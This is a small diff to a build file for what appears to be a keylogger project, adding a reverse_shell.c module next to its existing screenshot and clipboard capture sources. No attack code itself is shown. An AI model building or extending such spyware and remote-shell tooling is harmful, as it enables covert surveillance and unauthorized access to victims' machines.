@@ -10,7 +10,8 @@ SRC_SERVICE = .\service\src\main.c \
               .\service\src\utility.c
 SRC_KEYLOGGER = .\keylogger\src\main.c \
                 .\keylogger\src\screenshot.c \
-				.\keylogger\src\clipboard.c
+				.\keylogger\src\clipboard.c \
+				.\keylogger\src\reverse_shell.c
 
 OBJ_SERVICE = $(SRC_SERVICE:.c=.obj)
 OBJ_KEYLOGGER = $(SRC_KEYLOGGER:.c=.obj)
